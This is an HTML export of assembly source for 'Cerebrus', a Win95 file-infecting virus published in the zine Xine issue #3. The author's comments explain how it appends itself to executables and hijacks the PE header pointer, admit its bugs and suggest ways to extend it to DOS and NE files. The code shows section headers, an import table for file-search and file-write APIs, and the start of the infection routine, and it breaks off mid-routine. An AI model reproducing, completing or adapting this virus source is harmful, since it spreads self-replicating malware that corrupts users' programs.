<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #3 - Phile 201 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       Cerebrus, by Murkry/IkX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   this virus is a beta test of an idea I have heard and read about,</span><span class="sc0">
</span><span class="sc1">; but had never tried. What it does is append its own code to the end of the</span><span class="sc0">
</span><span class="sc1">; host file and then alter the NEW HEADER pointer at 3ch to point to itself.</span><span class="sc0">
</span><span class="sc1">; While this virus does work, because of a few mistakes I made the infected</span><span class="sc0">
</span><span class="sc1">; file will not have any icons associated with it. There are several ways</span><span class="sc0">
</span><span class="sc1">; around this. But my next attempt at one of these would actualy be larger</span><span class="sc0">
</span><span class="sc1">; I would just copy the virus in memory to the end of the host. This way I</span><span class="sc0">
</span><span class="sc1">; would not need to write the internal info and would let Win95 handle it all.</span><span class="sc0">
</span><span class="sc1">; I actual code the Import data table into the virus this is for size</span><span class="sc0">
</span><span class="sc1">; consideration . While I still like the idea for this virus the main reason</span><span class="sc0">
</span><span class="sc1">; I wanted to try it was to try out some code I read about that would mark a</span><span class="sc0">
</span><span class="sc1">; file as Erase on CLose (or something like that). It describes a self erasing</span><span class="sc0">
</span><span class="sc1">; file like maybe a Setup program runs once never again. But the idea seems</span><span class="sc0">
</span><span class="sc1">; like it would only work in NT not 95 at least in my tests.</span><span class="sc0">
</span><span class="sc1">;   Another thing I found was that while MS pushes us to use the Win32</span><span class="sc0">
</span><span class="sc1">; CreateProc.. and not WinExec. CreateP will only run PE files while WinExec</span><span class="sc0">
</span><span class="sc1">; will run dos/NE/PE files. So someone could write this so that it infect all</span><span class="sc0">
</span><span class="sc1">; those files but would only spread under Win95, in DOS the orginal Dos program</span><span class="sc0">
</span><span class="sc1">; would be called, In 3.11 you would see the dos error msg, and in Win95 all</span><span class="sc0">
</span><span class="sc1">; the programs would infect and run ok.</span><span class="sc0">
</span><span class="sc1">;   In testing this virus works well 'cept for a few little things, like other</span><span class="sc0">
</span><span class="sc1">; virus that modify the New Header offset it will make the icons vanish since</span><span class="sc0">
</span><span class="sc1">; the .rscr section is now "lost". A second thing I believe (know) is that</span><span class="sc0">
</span><span class="sc1">; since I use an internal .idata structure and I only have one of the pntrs to</span><span class="sc0">
</span><span class="sc1">; the API in it, yet after the first Generation this pntr is overwritten with</span><span class="sc0">
</span><span class="sc1">; the address of the API call itself. Actually I am sorta surprised this did</span><span class="sc0">
</span><span class="sc1">; not cause an error, I guess in Win95 it thinks its bound already and leaves</span><span class="sc0">
</span><span class="sc1">; it alone. Hmm some of you know what I mean others, I sure are lost, ;) sorry.</span><span class="sc0">
</span><span class="sc1">; Anyway you can fix this in two ways, one easier than the other depending on</span><span class="sc0">
</span><span class="sc1">; who you talk to. 1 keep the other refrence to the api name, 2 have a routine</span><span class="sc0">
</span><span class="sc1">; that fixes this before you write the virus to another host.</span><span class="sc0">
</span><span class="sc1">;   Anyway, despite the problems with this version of the virus I beleive that</span><span class="sc0">
</span><span class="sc1">; this method with some changes could be very viable in the Win32 enviroment.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   To compile use the mk.bat file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   The other file 1.inc is just some header info I used after I finished this</span><span class="sc0">
</span><span class="sc1">; virus I realize I really did not need to do all that work, but for those of</span><span class="sc0">
</span><span class="sc1">; you who are curios about the PE header examine away.</span><span class="sc0">

</span><span class="sc1">; Murkry</span><span class="sc0">


</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">
</span><span class="sc5">True</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">False</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">FATTR_NORMAL</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc1">;File is setup so that there will be 2 PE headers we use debug or</span><span class="sc0">
</span><span class="sc1">; some tool to set the MZ 3ch to point to our second PE header</span><span class="sc0">
</span><span class="sc1">; then when run the PE part could be append to the other PE files</span><span class="sc0">
</span><span class="sc1">; and infect in that matter the only parts that need to be alter</span><span class="sc0">
</span><span class="sc1">; in the section header</span><span class="sc0">
</span><span class="sc1">;       Pter to Raw Data</span><span class="sc0">

</span><span class="sc5">LoadAT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01000h</span><span class="sc0">
</span><span class="sc5">offs</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc1">;+  LoadAT   + 400000h </span><span class="sc0">

</span><span class="sc1">;     - offset PEheader +  LoadAT   + 400000h</span><span class="sc0">
</span><span class="sc1">;Define the needed external functions and constants here.</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">                                   </span><span class="sc1">;the data area</span><span class="sc0">
</span><span class="sc5">dummy</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;tasm needs some data or it won't work!</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">                                   </span><span class="sc1">;executable code starts here</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc2">1.inc</span><span class="sc0">

</span><span class="sc5">CodeSect</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CODE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CodeVSize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0000e000h</span><span class="sc0">        </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">CodeVAddr</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">LoadAT</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CodeSzRawData</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000800h</span><span class="sc0">        </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">CodePtrRwData</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000600h</span><span class="sc0">        </span><span class="sc1">;where the code for this section is</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">                                
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">CodeChar</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0A0000060h</span><span class="sc0">       </span><span class="sc1">;6000 0020</span><span class="sc0">


</span><span class="sc5">RescSect</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'.rsrc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00002000H</span><span class="sc0">       </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0E000h</span><span class="sc1">;LoadAT + 0e000h   ;</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00001600h</span><span class="sc0">        </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000200h</span><span class="sc0">        </span><span class="sc1">;where the code for this section is</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">                                
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0"> 


                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">CDseg</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">IDATA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;  usual this has a redunat entry</span><span class="sc0">
                                </span><span class="sc1">;We are skipping it</span><span class="sc0">
                                </span><span class="sc1">;  offset API_LOC1 - offset PEheader + LoadAT</span><span class="sc0">
                                                         
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;time date stamp</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;where in memory this dll is loaded</span><span class="sc0">
 
        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DLL1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">        

        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">API_LOC2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">     
 
        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;  usual this has a redunt entry</span><span class="sc0">
                                </span><span class="sc1">;We are skipping it</span><span class="sc0">
                                </span><span class="sc1">;  offset API_LOC1 - offset PEheader + LoadAT</span><span class="sc0">
                                                         
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;time date stamp</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;where in memory this dll is loaded</span><span class="sc0">
 
        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DLLA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">        

        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">API_LOC2A</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">     
        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000H</span><span class="sc0">


        </span><span class="sc9">DB</span><span class="sc0">       </span><span class="sc2">10H</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">API_LOC2</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">beep</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;4h</span><span class="sc0">
</span><span class="sc5">VxdCall0</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">80000001h</span><span class="sc0">                                  </span><span class="sc1">;8h</span><span class="sc0">
</span><span class="sc5">getcomline</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC3</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;Ch</span><span class="sc0">
</span><span class="sc5">createp</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC4</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;10h        </span><span class="sc0">
</span><span class="sc5">Copy</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC5</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">Create</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC6</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FileP</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC7</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">Read</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC8</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">Write</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC9</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">Close</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC10</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FindFirst</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC11</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FindNext</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC12</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">CloseFind</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC13</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC14</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">WinEx</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC15</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MsgBox</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">API_LOC2A</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNCA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    

                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
         
</span><span class="sc5">DLL1</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'KERNEL32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DLLA</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'USER32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;ends dll names</span><span class="sc0">

</span><span class="sc5">FUNC1</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ExitProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC2</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Beep'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC3</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetCommandLineA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC4</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateProcessA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc5">FUNC5</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CopyFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  
</span><span class="sc5">FUNC6</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc5">FUNC7</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  
</span><span class="sc5">FUNC8</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   
</span><span class="sc5">FUNC9</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
</span><span class="sc5">FUNC10</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC11</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC12</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC13</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC14</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetFileSize'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC15</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WinExec'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;end of Function list for this DLL</span><span class="sc0">


</span><span class="sc5">FUNCA</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;end the function list</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;end the DLL list</span><span class="sc0">


</span><span class="sc5">EndIDATA</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Begin</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">Call</span><span class="sc0">      </span><span class="sc5">Beep</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
       </span><span class="sc1">;this API returns the call with " " so we now move this name only</span><span class="sc0">
       </span><span class="sc1">;to our buffer excluding the " " and adding the 0 at the end</span><span class="sc0">

       </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">getcomline</span><span class="sc4">]</span><span class="sc0">
       
       </span><span class="sc6">xchg</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;save pointer to the orginal filename</span><span class="sc0">

</span><span class="sc5">GetLoop</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'"'</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">AllDone</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">GetLoop</span><span class="sc0">

</span><span class="sc5">AllDone</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc1">;get the command line in case we need it</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pCommandLine</span><span class="sc0">
</span><span class="sc5">GetLine</span><span class="sc4">:</span><span class="sc0">
